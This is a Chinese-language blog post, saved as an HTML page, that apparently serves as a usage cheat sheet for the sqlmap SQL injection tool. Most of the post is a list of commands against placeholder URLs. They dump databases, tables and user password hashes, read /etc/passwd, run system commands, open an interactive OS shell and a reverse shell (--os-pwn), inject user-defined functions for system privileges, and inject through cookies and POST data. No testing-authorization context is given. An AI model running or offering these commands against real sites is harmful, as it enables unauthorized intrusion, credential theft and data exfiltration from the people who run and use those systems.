<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>sqlmap使用文档  | Pyinx Blog</title>

  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  
    <meta name="keywords" content="sqlmap,sql注入," />
  

  <meta name="description" content="测试环境：ubuntu 10.10    sqlmap/1.0-dev (r4405)
转载请说明来源:http://hi.baidu.com/nginxshell    &amp;amp; lostwolf
建议linux下使用sqlmap windows下容易报错
更新升级 ：
sqlmap -update
svn checkout https://svn.sqlmap.org/sqlmap/trun">
<meta property="og:type" content="article">
<meta property="og:title" content="sqlmap使用文档 ">
<meta property="og:url" content="http://blog.itsir.org/2011/10/16/358/index.html">
<meta property="og:site_name" content="Pyinx Blog">
<meta property="og:description" content="测试环境：ubuntu 10.10    sqlmap/1.0-dev (r4405)
转载请说明来源:http://hi.baidu.com/nginxshell    &amp;amp; lostwolf
建议linux下使用sqlmap windows下容易报错
更新升级 ：
sqlmap -update
svn checkout https://svn.sqlmap.org/sqlmap/trun">
<meta property="og:updated_time" content="2015-08-06T02:38:30.000Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="sqlmap使用文档 ">
<meta name="twitter:description" content="测试环境：ubuntu 10.10    sqlmap/1.0-dev (r4405)
转载请说明来源:http://hi.baidu.com/nginxshell    &amp;amp; lostwolf
建议linux下使用sqlmap windows下容易报错
更新升级 ：
sqlmap -update
svn checkout https://svn.sqlmap.org/sqlmap/trun">
  
  

  


  <link rel="stylesheet" href="/css/styles.css" type="text/css">
  

  
  <script type="text/javascript">
    var _hmt = _hmt || [];
    (function() {
      var hm = document.createElement("script");
      hm.src = "//hm.baidu.com/hm.js?57e94d016e201fba3603a8a2b0263af0";
      var s = document.getElementsByTagName("script")[0];
      s.parentNode.insertBefore(hm, s);
    })();
  </script>


</head>

<body>
  <div class="content-post">
  <a class="avatar" href="/archives">
    <img src="/images/avatar.jpg" alt="" />
  </a>
  <article id="post-358" class="article article-type-post" itemscope itemprop="blogPost">

  <header class="article-header">
    <a class="post-title" href="/2011/10/16/358/">sqlmap使用文档 </a>

  </header>

  <div class="article-meta">
    <span>2011-10-16</span>

    <span> | </span>

    <span class="article-author">pyinx</span>

    <span> | </span>

    
  <span class="article-category">
    <a class="article-category-link" href="/categories/安全/">安全</a>
  </span>


  </div>
  <div class="article-inner">

    <div class="article-entry" itemprop="articleBody">
      
        <p>测试环境：ubuntu 10.10    sqlmap/1.0-dev (r4405)</p>
<p>转载请说明来源:<a href="http://hi.baidu.com/nginxshell" target="_blank" rel="external">http://hi.baidu.com/nginxshell</a>    &amp; lostwolf</p>
<p>建议linux下使用sqlmap windows下容易报错</p>
<p>更新升级 ：</p>
<p>sqlmap -update</p>
<p>svn checkout <a href="https://svn.sqlmap.org/sqlmap/trunk/sqlmap" target="_blank" rel="external">https://svn.sqlmap.org/sqlmap/trunk/sqlmap</a> sqlmap-dev</p>
<p>帮助:</p>
<p>sqlmap -h</p>
<p><strong><strong><strong><strong>**</strong></strong></strong></strong>基本步骤<strong><strong><strong><em>*</em></strong></strong></strong></p>
<p>sqlmap -u “<a href="http://url/news?id=1" target="_blank" rel="external">http://url/news?id=1</a>“ –level=3 –smart –dbms “Mysql” –current-user #获取当前用户名称</p>
<p>sqlmap -u “<a href="http://www.xxoo.com/news?id=1" target="_blank" rel="external">http://www.xxoo.com/news?id=1</a>“ –level=3 –smart –dbms “Mysql” –current-db  #获取当前数据库名称</p>
<p>sqlmap -u “<a href="http://www.xxoo.com/news?id=1" target="_blank" rel="external">http://www.xxoo.com/news?id=1</a>“ –level=3 –smart –dbms “Mysql”–tables  -D “db_name” #列表名<br>sqlmap -u “<a href="http://url/news?id=1" target="_blank" rel="external">http://url/news?id=1</a>“ –level=3 –smart  –dbms “Mysql” –columns -T “tablename” users-D “db_name” -v 0 #列字段</p>
<p>sqlmap -u “<a href="http://url/news?id=1" target="_blank" rel="external">http://url/news?id=1</a>“ –level=3 –smart –dbms “Mysql”  –dump  -C “column_name”  -T “table_name” -D “db_name” -v 0   #获取字段内容</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;<br><strong><strong><strong><strong>**</strong></strong></strong></strong>信息获取<strong><strong><strong><strong>**</strong></strong></strong></strong></p>
<p>sqlmap -u “<a href="/admin/%27http:/url/news?id=1">http://url/news?id=1”–level=3</a> –smart –dbms “Mysql” –users  #列数据库用户</p>
<p>sqlmap -u “<a href="/admin/%27http:/url/news?id=1">http://url/news?id=1”–level=3</a> –smart –dbms “Mysql” –dbs#列数据库</p>
<p>sqlmap -u “<a href="/admin/%27http:/url/news?id=1">http://url/news?id=1”–level=3</a> –smart –dbms “Mysql”–passwords #数据库用户密码</p>
<p>sqlmap -u “<a href="/admin/%27http:/url/news?id=1">http://url/news?id=1”–level=3</a> –smart –dbms “Mysql”–passwords-U root  -v 0 #列出指定用户数据库密码</p>
<p>sqlmap -u “<a href="/admin/%27http:/url/news?id=1">http://url/news?id=1”–level=3</a> –smart –dbms “Mysql” –dump-all -v 0 #列出所有数据库所有表<br>sqlmap -u “<a href="/admin/%27http:/url/news?id=1">http://url/news?id=1”–level=3</a> –smart –dbms “Mysql”–privileges #查看权限</p>
<p>sqlmap -u “<a href="/admin/%27http:/url/news?id=1">http://url/news?id=1”–level=3</a> –smart –dbms “Mysql”–privileges -U root #查看指定用户权限</p>
<p>sqlmap -u “<a href="/admin/%27http:/url/news?id=1">http://url/news?id=1”–level=3</a> –smart –dbms “Mysql” –is-dba -v 1 #是否是数据库管理员</p>
<p>sqlmap -u “<a href="/admin/%27http:/url/news?id=1">http://url/news?id=1”–level=3</a> –smart –dbms “Mysql” –roles #枚举数据库用户角色</p>
<p>sqlmap -u “<a href="/admin/%27http:/url/news?id=1">http://url/news?id=1”–level=3</a> –smart –dbms “Mysql”–udf-inject #导入用户自定义函数（获取系统权限！）<br>sqlmap -u “<a href="/admin/%27http:/url/news?id=1">http://url/news?id=1”–level=3</a> –smart –dbms “Mysql”–dump-all –exclude-sysdbs -v 0 #列出当前库所有表<br>sqlmap -u “<a href="/admin/%27http:/url/news?id=1">http://url/news?id=1”–level=3</a> –smart –dbms “Mysql” –union-check #是否支持union 注入</p>
<p>sqlmap -u “<a href="/admin/%27http:/url/news?id=1">http://url/news?id=1”–level=3</a> –smart –dbms “Mysql”–union-cols #union 查询表记录</p>
<p>sqlmap -u “<a href="/admin/%27http:/url/news?id=1">http://url/news?id=1”–level=3</a> –smart –dbms “Mysql” –union-test #union 语句测试<br>sqlmap -u “<a href="/admin/%27http:/url/news?id=1">http://url/news?id=1”–level=3</a> –smart –dbms “Mysql” –union-use –banner #采用union 注入</p>
<p>sqlmap -u “<a href="/admin/%27http:/url/news?id=1">http://url/news?id=1”–level=3</a> –smart –dbms “Mysql”–union-test –union-tech orderby #union 配合 order by<br>sqlmap -u “<a href="/admin/%27http:/url/news?id=1">http://url/news?id=1”–level=3</a> –smart –dbms “Mysql”–method “POST” – data “id=1&amp;cat=2” #post注入</p>
<p>sqlmap -u “<a href="/admin/%27http:/url/news?id=1">http://url/news?id=1”–level=3</a> –smart –dbms “Mysql”–cookie “COOKIE_VALUE” #cookie注入<br>sqlmap -u “<a href="/admin/%27http:/url/news?id=1">http://url/news?id=1”–level=3</a> –smart –dbms “Mysql”-b #获取banner信息</p>
<p>sqlmap -u “<a href="http://url/news?id=1" target="_blank" rel="external">http://url/news?id=1</a>“ –level=3 –smart-v 1 -f #指纹判别数据库类型</p>
<p>sqlmap -u “<a href="http://url/news?id=1" target="_blank" rel="external">http://url/news?id=1</a>“ –level=3 –smart–proxy”<a href="http://127.0.0.1:8118/" target="_blank" rel="external">http://127.0.0.1:8118</a>“ #代理注入</p>
<p>sqlmap -u “<a href="/admin/%27http:/url/news?id=1">http://url/news?id=1”–string”STRING_ON_TRUE_PAGE</a>“  #指定关键词</p>
<p>sqlmap -u “<a href="/admin/%27http:/url/news?id=1">http://url/news?id=1”–level=3</a> –smart –dbms “Mysql”–sql-shell #执行指定sql命令<br>sqlmap -u “<a href="/admin/%27http:/url/news?id=1">http://url/news?id=1”–level=3</a> –smart –dbms “Mysql”–file /etc/passwd</p>
<p>sqlmap -u “<a href="/admin/%27http:/url/news?id=1">http://url/news?id=1”–level=3</a> –smart –dbms “Mysql”–os-cmd=whoami #执行系统命令</p>
<p>sqlmap -u “<a href="/admin/%27http:/url/news?id=1">http://url/news?id=1”–level=3</a> –smart –dbms “Mysql”–os-shell #系统交互shell</p>
<p>sqlmap -u “<a href="/admin/%27http:/url/news?id=1">http://url/news?id=1”–level=3</a> –smart –dbms “Mysql”–os-pwn #反弹shell</p>
<p>sqlmap -u “<a href="/admin/%27http:/url/news?id=1">http://url/news?id=1”–level=3</a> –smart –dbms “Mysql”–reg-read #读取win系统注册表</p>
<p>sqlmap -u “<a href="/admin/%27http:/url/news?id=1">http://url/news?id=1”–level=3</a> –smart –dbms “Mysql” –dbs-o “sqlmap.log” #保存进度</p>
<p>sqlmap -u “<a href="/admin/%27http:/url/news?id=1">http://url/news?id=1”–level=3</a> –smart –dbms “Mysql” –dbs  -o “sqlmap.log” –resume  #恢复已保存进度</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p><strong><strong><em>*</em></strong></strong>安装最新版本<strong><strong><strong>*</strong></strong></strong></p>
<p>ubuntu 通过 apt-get install 安装的sqlmap版本为 0.6</p>
<p>我们通过svn 来安装 为 最新 1.0版</p>
<p>sudo svn checkout <a href="https://svn.sqlmap.org/sqlmap/trunk/sqlmap" target="_blank" rel="external">https://svn.sqlmap.org/sqlmap/trunk/sqlmap</a> sqlmap-dev</p>
<p>安装的位置为:/home/当前用户/sqlmap-dev/sqlmap.py</p>
<p>直接执行 /home/当前用户/sqlmap-dev/sqlmap.py –version</p>
<p>这样很不方便  我们可以设置 .bashrc 文件</p>
<p>sudo vim /home/当前用户/.bashrc</p>
<p>#任意位置加上：</p>
<p>alias sqlmap=’python /home/seclab/sqlmap-dev/sqlmap.py’</p>
<p>该环境变量只对当前用户有效</p>
<p>如果想对所有用户有效 可设置全局 编辑下面的文件</p>
<p>vim /etc/profile</p>
<p>同样加上：</p>
<p>alias sqlmap=’python /home/seclab/sqlmap-dev/sqlmap.py’<br>重启生效</p>
<div id="postother"><br><div id="trackback_address"><br><br>引用地址: <input type="text" value="http://www.lenhook.com/tb.php?sc=fe3ea5&amp;id=248"><br><br></div><br></div>
      
    </div>

    
      

    

  </div>
</article>



<section class="disqus-comments">
  <div id="disqus_thread">
    <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
  </div>
</section>




</div>

  
<script>
  var disqus_shortname = 'pyinx';
  
  var disqus_url = 'http://blog.itsir.org/2011/10/16/358/';
  
  (function(){
    var dsq = document.createElement('script');
    dsq.type = 'text/javascript';
    dsq.async = true;
    dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
  })();
</script>


  <!-- 多说公共JS代码 start (一个网页只需插入一次) -->
<script type="text/javascript">
var duoshuoQuery = {short_name:"undefined"};
(function() {
  var ds = document.createElement('script');
  ds.type = 'text/javascript';ds.async = true;
  ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
  ds.charset = 'UTF-8';
  (document.getElementsByTagName('head')[0]
   || document.getElementsByTagName('body')[0]).appendChild(ds);
})();
</script>
<!-- 多说公共JS代码 end -->

</body>
</html>
